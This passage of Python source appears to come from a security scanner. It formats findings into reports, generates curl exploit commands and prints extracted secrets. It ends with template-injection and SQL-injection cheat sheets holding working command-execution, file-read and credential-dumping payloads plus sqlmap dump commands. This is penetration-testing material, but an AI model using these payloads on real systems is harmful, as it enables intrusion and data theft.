        return f'curl -H "{param_name}: {payload}" http://TARGET{target_path}'
    if source == 'path':
        if ':' + param_name in target_path:
            test_path = target_path.replace(':' + param_name, payload)
        else:
            test_path = target_path.rstrip('/') + '/' + payload
        return f'curl "http://TARGET{test_path}"'
    return f'curl "http://TARGET{target_path}?{param_name}={encoded}"'


def format_exploitation_guidance(finding: Finding, lines: Optional[List[str]] = None) -> List[str]:
    """Tiered exploitation formatter. Returns lines ready to print.

    If `lines` is provided, taint-flow tracing is attempted for injection findings
    that have a known parameter.
    """
    out: List[str] = []
    category = finding.category

    # Non-injection categories get verification guidance instead of curl
    if category in _NON_INJECTION_CATEGORIES:
        out.append(f"    ┌─ VERIFICATION GUIDANCE ─────────────────────────────────────")
        if finding.route_path:
            out.append(f"    │  Route:  {finding.route_method or 'ALL'} {finding.route_path}")
        if finding.enclosing_function:
            out.append(f"    │  In:     {finding.enclosing_function}()")
        out.append(f"    │  {_NON_INJECTION_CATEGORIES[category]}")
        out.append(f"    └──────────────────────────────────────────────────────────")
        return out

    payload = _get_payload(finding.rule_id, category)
    has_route = bool(finding.route_path)
    has_param = bool(finding.param_name)

    # Attempt taint flow trace when source lines are available
    taint = None
    if lines and has_param:
        taint = _trace_taint_flow(lines, finding.line_number - 1, finding.param_name, finding.param_source)

    # Tier 1: Route + param known
    if has_route and has_param and payload:
        out.append(f"    ┌─ TESTED INJECTION POINT (from code analysis) ────────────")
        out.append(f"    │  Route:  {finding.route_method or 'ALL'} {finding.route_path}")
        out.append(f"    │  Param:  {finding.param_name} ({finding.param_source or 'unknown'})")
        if taint:
            out.append(f"    │")
            out.append(f"    │  DATA FLOW:")
            for ln, text, ann in taint['flow']:
                tag = f'  <-- {ann}' if ann else ''
                out.append(f"    │    [{ln:4}] {text}{tag}")
            if taint['sanitized']:
                out.append(f"    │  ⚠ Sanitization detected — exploitation may be blocked")
            else:
                out.append(f"    │  ✗ No sanitization between source and sink")
        out.append(f"    │  {_format_curl(finding.route_method, finding.route_path, finding.param_name, finding.param_source, payload)}")
        out.append(f"    └──────────────────────────────────────────────────────────")
        return out

    # Tier 2: Param known, no route
    if has_param and payload:
        out.append(f"    ┌─ LIKELY INJECTION POINT ─────────────────────────────────")
        out.append(f"    │  Param:  {finding.param_name} ({finding.param_source or 'unknown'})")
        if taint:
            out.append(f"    │")
            out.append(f"    │  DATA FLOW:")
            for ln, text, ann in taint['flow']:
                tag = f'  <-- {ann}' if ann else ''
                out.append(f"    │    [{ln:4}] {text}{tag}")
            if taint['sanitized']:
                out.append(f"    │  ⚠ Sanitization detected — exploitation may be blocked")
            else:
                out.append(f"    │  ✗ No sanitization between source and sink")
        out.append(f"    │  {_format_curl(finding.route_method, finding.route_path, finding.param_name, finding.param_source, payload)}")
        out.append(f"    └──────────────────────────────────────────────────────────")
        return out

    # Tier 3: Route known, no param
    if has_route and payload:
        out.append(f"    ┌─ VULNERABLE ROUTE ───────────────────────────────────────")
        out.append(f"    │  {finding.route_method or 'ALL'} {finding.route_path}")
        out.append(f"    │  Test body/query parameters for injection with: {payload}")
        out.append(f"    └──────────────────────────────────────────────────────────")
        return out

    # Tier 4: Neither known -- tell the user no route context was found
    if finding.enclosing_function:
        out.append(f"    ┌─ NO ROUTE CONTEXT FOUND ─────────────────────────────────")
        out.append(f"    │  In:     {finding.enclosing_function}()")
        out.append(f"    │  No HTTP route or parameter access detected near this code.")
        out.append(f"    │  Manually inspect the enclosing handler for injectable inputs.")
        out.append(f"    └──────────────────────────────────────────────────────────")
    else:
        out.append(f"    ┌─ NO ROUTE CONTEXT FOUND ─────────────────────────────────")
        out.append(f"    │  No HTTP route or parameter access detected near this code.")
        out.append(f"    │  Search the codebase for callers of this function to find")
        out.append(f"    │  where user input reaches this sink.")
        out.append(f"    └──────────────────────────────────────────────────────────")
    return out


class ReportGenerator:
    """Generate reports from scan results."""

    @staticmethod
    def print_summary(result: ScanResult, color: bool = True):
        """Print a summary of the scan results."""
        c = Colors if color else NoColors
        
        print(f"\n{'═' * 70}")
        print(f"{c.BOLD}📊 SCAN SUMMARY{c.RESET}")
        print(f"{'═' * 70}\n")
        
        print(f"  Target:         {result.target_path}")
        print(f"  Files Scanned:  {result.files_scanned}")
        print(f"  Duration:       {result.scan_duration_seconds:.2f} seconds")
        print(f"  Rules Loaded:   {ALL_TOTAL_RULES} rules across {len(ALL_CATEGORIES)} categories")
        print(f"  Total Findings: {result.total_findings}")
        
        if result.total_findings > 0:
            print(f"\n  {c.BOLD}Route Context Coverage:{c.RESET}")
            print(f"    With endpoint:  {result.findings_with_route}/{result.total_findings} findings linked to a route")
            print(f"    With parameter: {result.findings_with_param}/{result.total_findings} findings with identified input param")
            no_ctx = result.total_findings - max(result.findings_with_route, result.findings_with_param)
            if no_ctx > 0:
                print(f"    {c.DIM}⚠ {no_ctx} finding(s) have no route context — manual review needed{c.RESET}")
        
        if result.findings_by_severity:
            print(f"\n  {c.BOLD}Findings by Severity:{c.RESET}")
            for sev in ['CRITICAL', 'HIGH', 'MEDIUM', 'LOW', 'INFO']:
                count = result.findings_by_severity.get(sev, 0)
                if count > 0:
                    sev_color = SEVERITY_COLORS.get(Severity[sev], '') if color else ''
                    print(f"    {sev_color}● {sev}: {count}{c.RESET}")
        
        if result.findings_by_category:
            print(f"\n  {c.BOLD}Findings by Category:{c.RESET}")
            for cat, count in sorted(result.findings_by_category.items(), key=lambda x: -x[1]):
                print(f"    • {cat}: {count}")
        
        print()

    @staticmethod
    def print_attack_surface(result: ScanResult, color: bool = True):
        """Print the attack surface map from discovered routes."""
        c = Colors if color else NoColors
        routes = result.all_routes
        if not routes:
            return

        routes_sorted = sorted(routes, key=lambda r: (r.path, r.method))
        unprotected = sum(1 for r in routes if not r.auth_middleware)
        with_input = sum(1 for r in routes if r.params)

        print(f"\n{'═' * 70}")
        print(f"{c.BOLD}ATTACK SURFACE MAP ({len(routes)} endpoints discovered){c.RESET}")
        print(f"{'═' * 70}\n")

        hdr = f"  {'METHOD':<8} {'PATH':<30} {'PARAMS':<25} {'AUTH?'}"
        print(f"{c.BOLD}{hdr}{c.RESET}")
        print(f"  {'──────':<8} {'────':<30} {'──────':<25} {'─────'}")

        for r in routes_sorted:
            params_str = ', '.join(
                f"{p['name']} ({p['source']})" for p in r.params
            ) if r.params else '-'
            if len(params_str) > 24:
                params_str = params_str[:21] + '...'
            auth_str = r.auth_middleware if r.auth_middleware else f'{c.HIGH}No middleware{c.RESET}' if color else 'No middleware'
            method = r.method if r.method else 'ALL'
            path = r.path if len(r.path) <= 29 else r.path[:26] + '...'
            print(f"  {method:<8} {path:<30} {params_str:<25} {auth_str}")

        print()
        print(f"  {c.HIGH}Unprotected endpoints: {unprotected}/{len(routes)}{c.RESET}")
        print(f"  Endpoints accepting user input: {with_input}/{len(routes)}")
        print()

    _SECRET_RULE_IDS = {
        'AUTH-003', 'INFO-001', 'INFO-002', 'INFO-003', 'INFO-004', 'INFO-005', 'INFO-006',
        'PHP-AUTH-003', 'PHP-INFO-001', 'PHP-INFO-002',
        'PY-AUTH-001', 'PY-AUTH-002', 'PY-AUTH-003',
    }

    @staticmethod
    def _extract_secret_value(finding: Finding) -> str:
        """Pull the credential/token value from the matched text."""
        text = finding.match_highlight
        # For key=value patterns, grab the value portion
        m = re.search(r'''[=:]\s*['"]([^'"]{4,})['"]''', text)
        if m:
            return m.group(1)
        # For standalone tokens (AWS keys, GitHub PATs, Slack tokens, etc.)
        for pat in [
            r'(AKIA[0-9A-Z]{16})',
            r'(gh[pousr]_[A-Za-z0-9_]{36})',
            r'(glpat-[A-Za-z0-9\-]{20,})',
            r'(xox[baprs]-[0-9]{10,13}-[0-9]{10,13}-[a-zA-Z0-9]{24})',
            r'(eyJ[A-Za-z0-9_-]{10,}\.eyJ[A-Za-z0-9_-]{10,})',
        ]:
            m = re.search(pat, text)
            if m:
                return m.group(1)
        return text.strip()

    @classmethod
    def print_secrets(cls, result: ScanResult, color: bool = True):
        """Print an inventory of discovered secrets and hardcoded credentials."""
        c = Colors if color else NoColors
        secret_findings = [f for f in result.findings if f.rule_id in cls._SECRET_RULE_IDS]
        if not secret_findings:
            print(f"\n{c.DIM}No hardcoded secrets or credentials found.{c.RESET}\n")
            return

        print(f"\n{'═' * 70}")
        print(f"{c.BOLD}DISCOVERED SECRETS & CREDENTIALS ({len(secret_findings)} found){c.RESET}")
        print(f"{'═' * 70}\n")

        for i, f in enumerate(secret_findings, 1):
            sev_color = SEVERITY_COLORS.get(Severity[f.severity], '') if color else ''
            value = cls._extract_secret_value(f)
            print(f"  {c.BOLD}[{i}]{c.RESET} {f.rule_name} {sev_color}({f.severity}){c.RESET}")
            print(f"       File:  {f.file_path}:{f.line_number}")
            print(f"       Value: {c.CRITICAL}{value}{c.RESET}")
            print()

    @staticmethod
    def print_findings(result: ScanResult, verbose: bool = False, color: bool = True, 
                       show_exploitation: bool = True):
        """Print detailed findings with deduplication of exploitation text."""
        c = Colors if color else NoColors
        
        if not result.findings:
            print(f"\n{c.SUCCESS}✅ No vulnerabilities found!{c.RESET}\n")
            return
        
        print(f"\n{'═' * 70}")
        print(f"{c.BOLD}🚨 VULNERABILITY FINDINGS{c.RESET}")
        print(f"{'═' * 70}\n")
        
        seen_exploitation: Dict[str, int] = {}
        _file_lines_cache: Dict[str, List[str]] = {}

        def _get_file_lines(path: str) -> Optional[List[str]]:
            if path not in _file_lines_cache:
                try:
                    _file_lines_cache[path] = Path(path).read_text(encoding='utf-8', errors='ignore').split('\n')
                except Exception:
                    _file_lines_cache[path] = None
            return _file_lines_cache[path]
        
        for i, finding in enumerate(result.findings, 1):
            sev_color = SEVERITY_COLORS.get(Severity[finding.severity], '') if color else ''
            
            print(f"{c.BOLD}[{i}] {finding.rule_name}{c.RESET}")
            print(f"    {sev_color}Severity: {finding.severity}{c.RESET} | "
                  f"Category: {finding.category} | {finding.cwe_id}")
            loc_line = f"    📁 {finding.file_path}:{finding.line_number}"
            if finding.enclosing_function:
                loc_line += f"  in {finding.enclosing_function}()"
            print(loc_line)
            if finding.route_path:
                print(f"    🔗 Route: {finding.route_method or 'ALL'} {finding.route_path}")
            print()
            
            # Code context with line numbers
            print(f"    {c.DIM}Code Context:{c.RESET}")
            ctx_line_num = finding.line_number - len(finding.context_before)
            for ctx_line in finding.context_before:
                print(f"    {c.DIM}  [{ctx_line_num:4}] {ctx_line}{c.RESET}")
                ctx_line_num += 1
            print(f"    {sev_color}➤ [{finding.line_number:4}] {finding.line_content}{c.RESET}")
            ctx_line_num = finding.line_number + 1
            for ctx_line in finding.context_after:
                print(f"    {c.DIM}  [{ctx_line_num:4}] {ctx_line}{c.RESET}")
                ctx_line_num += 1
            print()
            
            print(f"    {c.BOLD}Description:{c.RESET}")
            print(f"    {finding.description}")
            print()
            
            if show_exploitation and finding.exploitation:
                print(f"    {c.CRITICAL}⚔️  EXPLOITATION GUIDANCE:{c.RESET}")

                # Smart tiered guidance block with taint flow
                file_lines = _get_file_lines(finding.file_path)
                guidance_lines = format_exploitation_guidance(finding, lines=file_lines)
                if guidance_lines:
                    for gl in guidance_lines:
                        print(gl)
                    print()

                # Deduplication: show full text first time, back-reference after
                dedup_key = (finding.rule_id, finding.exploitation.strip())
                if dedup_key in seen_exploitation:
                    ref = seen_exploitation[dedup_key]
                    print(f"    {c.DIM}(See finding #{ref} for full exploitation guidance — same vulnerability type){c.RESET}")
                else:
                    seen_exploitation[dedup_key] = i
                    for line in finding.exploitation.strip().split('\n'):
                        print(f"    {line}")
                print()
            
            if verbose:
                print(f"    {c.SUCCESS}🛡️  Remediation:{c.RESET}")
                print(f"    {finding.remediation}")
                print()
            
            print(f"{'─' * 70}\n")

    @staticmethod
    def export_json(result: ScanResult, output_path: str):
        """Export results to JSON file."""
        # Convert findings to dicts
        output = {
            'scan_time': result.scan_time,
            'target_path': result.target_path,
            'files_scanned': result.files_scanned,
            'total_findings': result.total_findings,
            'findings_by_severity': result.findings_by_severity,
            'findings_by_category': result.findings_by_category,
            'scan_duration_seconds': result.scan_duration_seconds,
            'findings': [asdict(f) for f in result.findings],
            'routes': [asdict(r) for r in result.all_routes],
        }
        
        with open(output_path, 'w') as f:
            json.dump(output, f, indent=2)
        
        print(f"✅ Results exported to: {output_path}")

    @staticmethod
    def export_html(result: ScanResult, output_path: str):
        """Export results to interactive HTML report with route context and attack surface."""
        import html as html_mod

        def _esc(text: str) -> str:
            return html_mod.escape(str(text))

        # Build attack surface rows
        attack_surface_html = ""
        if result.all_routes:
            rows = []
            for r in sorted(result.all_routes, key=lambda r: (r.path, r.method)):
                params = ', '.join(f"{p['name']} ({p['source']})" for p in r.params) if r.params else '-'
                auth = _esc(r.auth_middleware) if r.auth_middleware else '<span style="color:var(--high)">No middleware</span>'
                rows.append(f'<tr><td>{_esc(r.method)}</td><td>{_esc(r.path)}</td><td>{_esc(params)}</td><td>{auth}</td><td class="finding-meta">{_esc(r.source_file)}</td></tr>')
            unprotected = sum(1 for r in result.all_routes if not r.auth_middleware)
            attack_surface_html = f'''
            <div class="section" style="margin-bottom:2rem">
                <h2 style="margin-bottom:1rem">Attack Surface Map ({len(result.all_routes)} endpoints)</h2>
                <table class="surface-table"><thead>
                    <tr><th>Method</th><th>Path</th><th>Params</th><th>Auth</th><th>File</th></tr>
                </thead><tbody>{''.join(rows)}</tbody></table>
                <p style="margin-top:0.75rem;color:var(--high)">Unprotected endpoints: {unprotected}/{len(result.all_routes)}</p>
            </div>'''

        # Build finding cards
        finding_cards = []
        for f in result.findings:
            route_html = ""
            if f.route_path:
                route_html = f'<div class="route-tag">{_esc(f.route_method or "ALL")} {_esc(f.route_path)}</div>'
            if f.param_name:
                route_html += f'<div class="route-tag">Param: {_esc(f.param_name)} ({_esc(f.param_source)})</div>'

            guidance_lines = format_exploitation_guidance(f)
            guidance_html = _esc('\n'.join(guidance_lines)) if guidance_lines else ''

            ctx_before = ''.join(f'<span>{_esc(l)}</span><br>' for l in f.context_before)
            ctx_after = ''.join(f'<span>{_esc(l)}</span><br>' for l in f.context_after)

            finding_cards.append(f'''
            <div class="finding" data-severity="{f.severity.lower()}">
                <div class="finding-header {f.severity.lower()}" onclick="this.parentElement.classList.toggle('expanded')">
                    <div>
                        <div class="finding-title">[{_esc(f.rule_id)}] {_esc(f.rule_name)}</div>
                        <div class="finding-meta">{_esc(f.file_path)}:{f.line_number} | {_esc(f.category)} | {_esc(f.cwe_id)}</div>
                        {route_html}
                    </div>
                    <span class="badge {f.severity.lower()}">{f.severity}</span>
                </div>
                <div class="finding-body">
                    <div class="section"><h4>Code Context</h4>
                        <div class="code-block">{ctx_before}<span class="highlight">➤ {_esc(f.line_content)}</span>{ctx_after}</div>
                    </div>
                    <div class="section"><h4>Description</h4><p>{_esc(f.description)}</p></div>
                    <div class="section"><h4>Exploitation Guidance</h4><div class="exploitation">{guidance_html}</div></div>
                    <div class="section"><h4>Generic Exploitation</h4><div class="exploitation">{_esc(f.exploitation)}</div></div>
                    <div class="section"><h4>Remediation</h4><div class="remediation">{_esc(f.remediation)}</div></div>
                </div>
            </div>''')

        html_template = f'''<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Security Scan Report</title>
    <style>
        :root {{--critical:#dc2626;--high:#ea580c;--medium:#ca8a04;--low:#2563eb;--info:#0891b2;--bg:#0f172a;--card:#1e293b;--text:#e2e8f0;--border:#334155;}}
        * {{box-sizing:border-box;margin:0;padding:0;}}
        body {{font-family:'SF Mono','Fira Code',monospace;background:var(--bg);color:var(--text);line-height:1.6;padding:2rem;}}
        .container {{max-width:1200px;margin:0 auto;}}
        header {{text-align:center;padding:2rem 0;border-bottom:1px solid var(--border);margin-bottom:2rem;}}
        h1 {{font-size:2rem;margin-bottom:0.5rem;}} h2 {{font-size:1.4rem;}}
        .subtitle {{color:#94a3b8;}}
        .stats {{display:grid;grid-template-columns:repeat(auto-fit,minmax(200px,1fr));gap:1rem;margin-bottom:2rem;}}
        .stat-card {{background:var(--card);padding:1.5rem;border-radius:8px;border:1px solid var(--border);}}
        .stat-card h3 {{font-size:0.875rem;color:#94a3b8;margin-bottom:0.5rem;}}
        .stat-card .value {{font-size:2rem;font-weight:bold;}}
        .severity-badges {{display:flex;gap:0.5rem;flex-wrap:wrap;margin-top:1rem;}}
        .badge {{padding:0.25rem 0.75rem;border-radius:9999px;font-size:0.75rem;font-weight:bold;}}
        .badge.critical {{background:var(--critical);}} .badge.high {{background:var(--high);}}
        .badge.medium {{background:var(--medium);color:#000;}} .badge.low {{background:var(--low);}} .badge.info {{background:var(--info);}}
        .findings {{display:flex;flex-direction:column;gap:1rem;}}
        .finding {{background:var(--card);border-radius:8px;border:1px solid var(--border);overflow:hidden;}}
        .finding-header {{padding:1rem;display:flex;justify-content:space-between;align-items:flex-start;cursor:pointer;border-left:4px solid;}}
        .finding-header.critical {{border-color:var(--critical);}} .finding-header.high {{border-color:var(--high);}}
        .finding-header.medium {{border-color:var(--medium);}} .finding-header.low {{border-color:var(--low);}} .finding-header.info {{border-color:var(--info);}}
        .finding-title {{font-weight:bold;margin-bottom:0.25rem;}}
        .finding-meta {{font-size:0.875rem;color:#94a3b8;}}
        .route-tag {{display:inline-block;background:#1e3a5f;padding:0.15rem 0.5rem;border-radius:4px;font-size:0.8rem;margin-top:0.25rem;margin-right:0.25rem;}}
        .finding-body {{padding:1rem;border-top:1px solid var(--border);display:none;}}
        .finding.expanded .finding-body {{display:block;}}
        .code-block {{background:#0d1117;padding:1rem;border-radius:4px;overflow-x:auto;margin:1rem 0;font-size:0.875rem;}}
        .code-block .highlight {{background:rgba(234,88,12,0.3);display:block;}}
        .section {{margin:1rem 0;}}
        .section h4 {{color:#94a3b8;font-size:0.75rem;text-transform:uppercase;margin-bottom:0.5rem;}}
        .exploitation {{background:rgba(220,38,38,0.1);border:1px solid var(--critical);border-radius:4px;padding:1rem;white-space:pre-wrap;font-size:0.875rem;}}
        .remediation {{background:rgba(34,197,94,0.1);border:1px solid #22c55e;border-radius:4px;padding:1rem;}}
        .filter-bar {{display:flex;gap:0.5rem;margin-bottom:1rem;flex-wrap:wrap;}}
        .filter-btn {{padding:0.5rem 1rem;background:var(--card);border:1px solid var(--border);border-radius:4px;color:var(--text);cursor:pointer;font-family:inherit;}}
        .filter-btn.active {{background:#3b82f6;border-color:#3b82f6;}} .filter-btn:hover {{border-color:#3b82f6;}}
        .surface-table {{width:100%;border-collapse:collapse;font-size:0.85rem;}}
        .surface-table th,.surface-table td {{padding:0.5rem 0.75rem;border:1px solid var(--border);text-align:left;}}
        .surface-table th {{background:var(--card);color:#94a3b8;text-transform:uppercase;font-size:0.75rem;}}
    </style>
</head>
<body>
    <div class="container">
        <header>
            <h1>Security Scan Report</h1>
            <p class="subtitle">Generated: {_esc(result.scan_time)} | Target: {_esc(result.target_path)}</p>
        </header>
        <div class="stats">
            <div class="stat-card"><h3>Files Scanned</h3><div class="value">{result.files_scanned}</div></div>
            <div class="stat-card"><h3>Total Findings</h3><div class="value">{result.total_findings}</div></div>
            <div class="stat-card"><h3>Endpoints</h3><div class="value">{len(result.all_routes)}</div></div>
            <div class="stat-card"><h3>Scan Duration</h3><div class="value">{result.scan_duration_seconds:.2f}s</div></div>
            <div class="stat-card"><h3>Severity Breakdown</h3>
                <div class="severity-badges">{''.join(f'<span class="badge {sev.lower()}">{sev}: {count}</span>' for sev, count in result.findings_by_severity.items())}</div>
            </div>
        </div>
        {attack_surface_html}
        <div class="filter-bar">
            <button class="filter-btn active" data-filter="all">All</button>
            <button class="filter-btn" data-filter="critical">Critical</button>
            <button class="filter-btn" data-filter="high">High</button>
            <button class="filter-btn" data-filter="medium">Medium</button>
            <button class="filter-btn" data-filter="low">Low</button>
            <button class="filter-btn" data-filter="info">Info</button>
        </div>
        <div class="findings">{''.join(finding_cards)}</div>
    </div>
    <script>
        document.querySelectorAll('.filter-btn').forEach(btn => {{
            btn.addEventListener('click', () => {{
                document.querySelectorAll('.filter-btn').forEach(b => b.classList.remove('active'));
                btn.classList.add('active');
                const filter = btn.dataset.filter;
                document.querySelectorAll('.finding').forEach(f => {{
                    f.style.display = (filter === 'all' || f.dataset.severity === filter) ? 'block' : 'none';
                }});
            }});
        }});
    </script>
</body>
</html>'''
        
        with open(output_path, 'w') as fh:
            fh.write(html_template)
        
        print(f"✅ HTML report exported to: {output_path}")
    
    @staticmethod
    def export_csv(result: ScanResult, output_path: str):
        """Export results to CSV file with route context."""
        import csv
        
        with open(output_path, 'w', newline='') as f:
            writer = csv.writer(f)
            writer.writerow([
                'Severity', 'Rule ID', 'Rule Name', 'Category', 'CWE',
                'File', 'Line', 'Code', 'Description',
                'Route Method', 'Route Path', 'Param Name', 'Param Source', 'Function',
            ])
            
            for finding in result.findings:
                writer.writerow([
                    finding.severity,
                    finding.rule_id,
                    finding.rule_name,
                    finding.category,
                    finding.cwe_id,
                    finding.file_path,
                    finding.line_number,
                    finding.line_content[:200],
                    finding.description,
                    finding.route_method,
                    finding.route_path,
                    finding.param_name,
                    finding.param_source,
                    finding.enclosing_function,
                ])
        
        print(f"✅ CSV report exported to: {output_path}")
    
    @staticmethod
    def export_urls(result: ScanResult, output_path: str):
        """Export discovered routes as a plain URL list for fuzzing."""
        lines = []
        for r in sorted(result.all_routes, key=lambda r: (r.path, r.method)):
            method = r.method if r.method else 'GET'
            if r.params:
                query_params = [p for p in r.params if p['source'] in ('query', 'get', 'request')]
                body_params = [p for p in r.params if p['source'] in ('body', 'post')]
                path_str = r.path
                if query_params:
                    qs = '&'.join(f"{p['name']}=FUZZ" for p in query_params)
                    path_str = f"{r.path}?{qs}"
                body_note = ''
                if body_params:
                    body_str = '&'.join(p['name'] + '=FUZZ' for p in body_params)
                    body_note = f"  (body: {body_str})"
                lines.append(f"{method:<7} http://TARGET{path_str}{body_note}")
            else:
                lines.append(f"{method:<7} http://TARGET{r.path}")

        if not lines:
            print("⚠ No routes discovered — nothing to export.")
            return

        with open(output_path, 'w') as fh:
            fh.write('\n'.join(lines) + '\n')
        print(f"✅ URL list exported to: {output_path} ({len(lines)} endpoints)")

    @staticmethod
    def export_burp(result: ScanResult, output_path: str):
        """Export discovered routes as a Burp Suite-compatible sitemap XML."""
        import html as html_mod
        from base64 import b64encode

        items = []
        for r in sorted(result.all_routes, key=lambda r: (r.path, r.method)):
            method = r.method if r.method else 'GET'
            url = f"http://TARGET{r.path}"

            query_params = [p for p in r.params if p['source'] in ('query', 'get', 'request')]
            body_params = [p for p in r.params if p['source'] in ('body', 'post')]

            if query_params:
                qs = '&'.join(f"{p['name']}=FUZZ" for p in query_params)
                url += f"?{qs}"

            body_line = ''
            content_type_hdr = ''
            if body_params:
                body_line = '&'.join(f"{p['name']}=FUZZ" for p in body_params)
                content_type_hdr = 'Content-Type: application/x-www-form-urlencoded\r\n'

            request_str = f"{method} {r.path}{'?' + qs if query_params else ''} HTTP/1.1\r\nHost: TARGET\r\n{content_type_hdr}\r\n{body_line}"
            req_b64 = b64encode(request_str.encode()).decode()

            items.append(f'''  <item>
    <url>{html_mod.escape(url)}</url>
    <host>TARGET</host>
    <port>80</port>
    <protocol>http</protocol>
    <method>{html_mod.escape(method)}</method>
    <path>{html_mod.escape(r.path)}</path>
    <request base64="true">{req_b64}</request>
  </item>''')

        if not items:
            print("⚠ No routes discovered — nothing to export.")
            return

        xml = f'<?xml version="1.0"?>\n<items burpVersion="2024.0" exportTime="{result.scan_time}">\n' + '\n'.join(items) + '\n</items>\n'
        with open(output_path, 'w') as fh:
            fh.write(xml)
        print(f"✅ Burp sitemap exported to: {output_path} ({len(items)} requests)")

    def print_brief(self, result: ScanResult, color: bool = True):
        """Print brief output - just file:line:severity:rule."""
        if not color:
            for finding in result.findings:
                print(f"{finding.file_path}:{finding.line_number}:{finding.severity}:{finding.rule_name}")
        else:
            for finding in result.findings:
                sev = Severity(finding.severity)
                sev_color = SEVERITY_COLORS.get(sev, '')
                print(f"{finding.file_path}:{finding.line_number}:{sev_color}{finding.severity}{Colors.RESET}:{finding.rule_name}")


def grep_files(target_path: str, pattern: str, extensions: set, include_vendor: bool = False):
    """Search for custom regex pattern in files."""
    import re
    
    target = Path(target_path).resolve()
    skip_dirs = {'node_modules', '.git', 'dist', 'build', '.next', 'coverage', 
                 '__pycache__', '.cache', 'bower_components'}
    if not include_vendor:
        skip_dirs.add('vendor')
    
    try:
        compiled = re.compile(pattern, re.IGNORECASE | re.MULTILINE)
    except re.error as e:
        print(f"{Colors.CRITICAL}Invalid regex pattern: {e}{Colors.RESET}")
        return
    
    print(f"\n{Colors.BOLD}Searching for pattern: {Colors.RESET}{pattern}\n")
    
    match_count = 0
    file_count = 0
    
    files = [target] if target.is_file() else target.rglob('*')
    
    for file_path in files:
        if file_path.is_dir():
            continue
        if file_path.suffix.lower() not in extensions:
            continue
        if any(part in skip_dirs for part in file_path.parts):
            continue
        
        try:
            content = file_path.read_text(encoding='utf-8', errors='ignore')
            lines = content.split('\n')
            
            file_has_match = False
            for i, line in enumerate(lines, 1):
                if compiled.search(line):
                    if not file_has_match:
                        print(f"{Colors.BOLD}{file_path}{Colors.RESET}")
                        file_has_match = True
                        file_count += 1
                    
                    print(f"  {Colors.DIM}{i:4}:{Colors.RESET} {line.strip()[:150]}")
                    match_count += 1
            
            if file_has_match:
                print()
                
        except Exception:
            pass
    
    print(f"{Colors.DIM}Found {match_count} matches in {file_count} files{Colors.RESET}\n")


CHEATSHEETS = {
    'ssti': """
╔══════════════════════════════════════════════════════════════════════════════╗
║  SERVER-SIDE TEMPLATE INJECTION (SSTI) CHEATSHEET                            ║
╚══════════════════════════════════════════════════════════════════════════════╝

DETECTION:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
{{7*7}}              → 49 (most engines)
{{7*'7'}}            → 7777777 (Jinja2) or 49 (Twig)
${7*7}               → 49 (Freemarker, Velocity)
<%= 7*7 %>           → 49 (ERB)
#{7*7}               → 49 (Ruby slim)

JINJA2 (Flask/Python):
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# RCE
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
{{cycler.__init__.__globals__.os.popen('id').read()}}
{{lipsum.__globals__['os'].popen('id').read()}}
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}

# File read
{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}

# Config/secrets
{{config.items()}}
{{config.SECRET_KEY}}

TWIG (PHP):
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# Twig 1.x RCE
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}

# Twig 2.x/3.x RCE
{{['id']|filter('system')}}
{{'id'|filter('passthru')}}

# File read
{{'/etc/passwd'|file_excerpt(1,30)}}

FREEMARKER (Java):
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
${"freemarker.template.utility.Execute"?new()("id")}
""",

    'sqli': """
╔══════════════════════════════════════════════════════════════════════════════╗
║  SQL INJECTION CHEATSHEET                                                    ║
╚══════════════════════════════════════════════════════════════════════════════╝

DETECTION:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
'                    (single quote - check for errors)
''                   (escaped single quote)
' OR '1'='1          (always true)
' AND '1'='2         (always false - compare behavior)
' OR SLEEP(5)--      (time-based blind)

UNION ATTACKS:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# Find column count
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--       (increment until error)

# Union select
' UNION SELECT null--
' UNION SELECT null,null--
' UNION SELECT 1,2,3--

# Extract data
' UNION SELECT username,password FROM users--
' UNION SELECT table_name,null FROM information_schema.tables--
' UNION SELECT column_name,null FROM information_schema.columns WHERE table_name='users'--

MySQL:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
' UNION SELECT @@version,null--
' UNION SELECT user(),null--
' UNION SELECT schema_name,null FROM information_schema.schemata--
' UNION SELECT LOAD_FILE('/etc/passwd'),null--

PostgreSQL:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
' UNION SELECT version(),null--
' UNION SELECT current_user,null--
'; CREATE TABLE cmd_exec(output text); COPY cmd_exec FROM PROGRAM 'id';--

SQLite:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
' UNION SELECT sql,null FROM sqlite_master--
' UNION SELECT name,null FROM sqlite_master WHERE type='table'--

SQLMAP:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
sqlmap -u "http://target.com/?id=1" --dbs
sqlmap -u "http://target.com/?id=1" -D dbname --tables
sqlmap -u "http://target.com/?id=1" -D dbname -T users --dump
